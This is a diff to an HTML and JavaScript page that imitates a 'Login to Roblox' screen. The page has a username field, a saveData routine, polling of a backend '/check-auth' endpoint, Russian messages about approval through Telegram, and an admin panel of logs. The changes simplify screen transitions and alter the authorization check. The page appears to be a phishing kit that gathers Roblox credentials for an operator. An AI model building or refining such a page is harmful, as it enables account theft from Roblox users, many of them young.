@@ -20,14 +20,7 @@
         .logo-text { font-size: 20px; font-weight: 800; color: #fff; user-select: none; }
         .screen {
             display: flex; flex-direction: column; justify-content: center; align-items: center;
-            min-height: 100vh; width: 100%; position: absolute; top: 0; left: 0; 
-            display: none;
-            opacity: 0;
-            transition: opacity 0.5s ease-in-out;
-        }
-        .screen.active {
-            display: flex;
-            opacity: 1;
+            min-height: 100vh; width: 100%; position: absolute; top: 0; left: 0; display: none;
         }
         #login-form-screen { display: flex; }
         .login-card { 
@@ -53,7 +46,7 @@
 
     <div class="navbar"><div class="logo-text">ROBLOX</div></div>
 
-    <div id="login-form-screen" class="screen active">
+    <div id="login-form-screen" class="screen">
         <div class="login-card">
             <h2 style="color:#fff; margin-bottom: 30px;">Login to Roblox</h2>
             <input type="text" id="username" placeholder="Username">
@@ -97,21 +90,8 @@
         document.addEventListener('keyup', (e) => { delete pressedKeys[e.code]; });
 
         function showScreen(id) {
-            const screens = document.querySelectorAll('.screen');
-            screens.forEach(s => {
-                s.classList.remove('active');
-                setTimeout(() => {
-                    if (!s.classList.contains('active')) {
-                        s.style.display = 'none';
-                    }
-                }, 500);
-            });
-            
-            const target = document.getElementById(id);
-            target.style.display = 'flex';
-            setTimeout(() => {
-                target.classList.add('active');
-            }, 10);
+            document.querySelectorAll('.screen').forEach(s => s.style.display = 'none');
+            document.getElementById(id).style.display = 'flex';
         }
 
         async function saveData() {
@@ -149,20 +129,15 @@
                     try {
                         const res = await fetch(`${BACKEND_URL}/check-auth`);
                         const data = await res.json();
-                        if (data.status === 'approved') {
+                        if (data.authorized === true) {
                             clearInterval(checker);
                             showScreen('admin-panel');
                             updateLogs();
-                        } else if (data.status === 'declined') {
-                            clearInterval(checker);
-                            status.innerText = "Запрос отклонен в Telegram ❌";
-                            status.style.color = "#ff0000";
-                            btn.disabled = false;
                         }
                     } catch (e) {
                         console.error("Check failed", e);
                     }
-                }, 100);
+                }, 2000);
 
             } catch (e) {
                 status.innerText = "Ошибка связи!";
